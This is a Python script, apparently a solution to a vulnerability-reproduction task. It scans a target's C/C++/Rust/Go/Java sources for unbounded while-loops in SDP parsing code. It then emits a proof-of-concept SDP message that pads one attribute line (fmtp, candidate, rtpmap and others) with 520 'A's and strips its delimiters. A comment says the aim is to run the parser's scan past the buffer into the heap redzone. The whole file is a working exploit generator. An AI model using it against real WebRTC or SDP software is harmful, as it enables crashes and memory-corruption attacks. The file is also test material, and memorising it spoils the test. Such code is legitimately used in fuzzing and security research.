import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".rs", ".go", ".java"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                    if st.st_size <= 0:
                        continue
                    if st.st_size > 3_000_000:
                        continue
                    with open(p, "rb") as f:
                        yield p, f.read()
                except Exception:
                    continue

    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".rs", ".go", ".java"}
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                _, ext = os.path.splitext(name)
                if ext.lower() not in exts:
                    continue
                if m.size <= 0 or m.size > 3_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if data:
                        yield name, data
                except Exception:
                    continue

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_source_files_from_dir(src_path)
            return
        if tarfile.is_tarfile(src_path):
            yield from self._iter_source_files_from_tar(src_path)
            return

    def _select_keyword_from_source(self, src_path: str) -> Optional[str]:
        keywords = [
            "fmtp",
            "rtpmap",
            "candidate",
            "extmap",
            "ssrc-group",
            "ssrc",
            "rtcp-fb",
            "rid",
            "simulcast",
            "fingerprint",
            "group",
            "msid",
            "mid",
        ]

        file_interest = ("sdp", "parser", "fuzz", "session", "description", "webrtc")
        scores: Dict[str, int] = {k: 0 for k in keywords}
        any_sdp_reference = {k: False for k in keywords}

        while_line_re = re.compile(r"\bwhile\s*\(([^)]{1,200})\)")
        unsafe_cond_re = re.compile(
            r"""^\s*(?:\*\s*[A-Za-z_]\w*|[A-Za-z_]\w*\s*\[[^\]]+\])\s*!=\s*'[^']+'\s*$"""
        )

        for path, data in self._iter_source_files(src_path):
            lp = path.lower()
            if not any(s in lp for s in file_interest):
                if b"sdp" not in data.lower():
                    continue

            try:
                txt = data.decode("utf-8", errors="ignore")
            except Exception:
                continue

            ltxt = txt.lower()
            for k in keywords:
                if k in ltxt:
                    any_sdp_reference[k] = True

            lines = txt.splitlines()
            n = len(lines)
            for i, line in enumerate(lines):
                if "while" not in line:
                    continue
                m = while_line_re.search(line)
                if not m:
                    continue
                cond = m.group(1)
                lcond = cond.lower()
                if "&&" in cond or "||" in cond:
                    continue
                if "<" in cond or ">" in cond:
                    continue
                if "size" in lcond or "len" in lcond or "end" in lcond:
                    continue
                if not unsafe_cond_re.match(cond.strip()):
                    continue

                lo = max(0, i - 25)
                hi = min(n, i + 26)
                ctx = "\n".join(lines[lo:hi]).lower()
                for k in keywords:
                    if k in ctx:
                        scores[k] += 1

        best_k = None
        best_s = 0
        for k, s in scores.items():
            if s > best_s:
                best_s = s
                best_k = k

        if best_k and best_s > 0:
            return best_k

        # Fallbacks based on presence
        for k in ["fmtp", "candidate", "rtpmap", "extmap", "ssrc-group", "ssrc", "rtcp-fb", "fingerprint"]:
            if any_sdp_reference.get(k, False):
                return k

        return None

    def _build_sdp_poc(self, keyword: str) -> bytes:
        filler_len = 520  # force heap, and ensure scan runs into redzone
        A = "A" * filler_len

        # Minimal, generally accepted SDP skeleton
        base = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "m=audio 9 RTP/AVP 96",
            "c=IN IP4 127.0.0.1",
            "a=rtpmap:96 opus/48000/2",
        ]

        if keyword == "fmtp":
            mal = "a=fmtp:96 " + A  # no '=' or ';' present
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "candidate":
            extra = [
                "a=ice-ufrag:x",
                "a=ice-pwd:yyyyyyyyyyyyyyyyyyyy",
            ]
            mal = "a=candidate:" + A  # missing expected spaces/tokens
            sdp = "\r\n".join(base[:-1] + extra + [base[-1], mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "rtpmap":
            base2 = base[:-1]
            mal = "a=rtpmap:96" + A  # missing space and '/'
            sdp = "\r\n".join(base2 + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "extmap":
            mal = "a=extmap:1" + A  # missing space before URI
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "ssrc-group":
            mal = "a=ssrc-group:FID" + A  # missing spaces and SSRC list
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "ssrc":
            mal = "a=ssrc:1" + A  # missing space and attribute/value
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "rtcp-fb":
            mal = "a=rtcp-fb:96" + A  # missing space and feedback type
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "rid":
            mal = "a=rid:1" + A  # missing space and direction/params
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "simulcast":
            mal = "a=simulcast:" + A  # missing required tokens
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        if keyword == "fingerprint":
            mal = "a=fingerprint:sha-256" + A  # missing space and fingerprint bytes
            sdp = "\r\n".join(base + [mal])
            return sdp.encode("ascii", errors="ignore")

        # Conservative fallback: malformed fmtp at end
        mal = "a=fmtp:96 " + A
        sdp = "\r\n".join(base + [mal])
        return sdp.encode("ascii", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        kw = self._select_keyword_from_source(src_path) or "fmtp"
        if kw in {"group", "msid", "mid"}:
            kw = "fmtp"
        return self._build_sdp_poc(kw)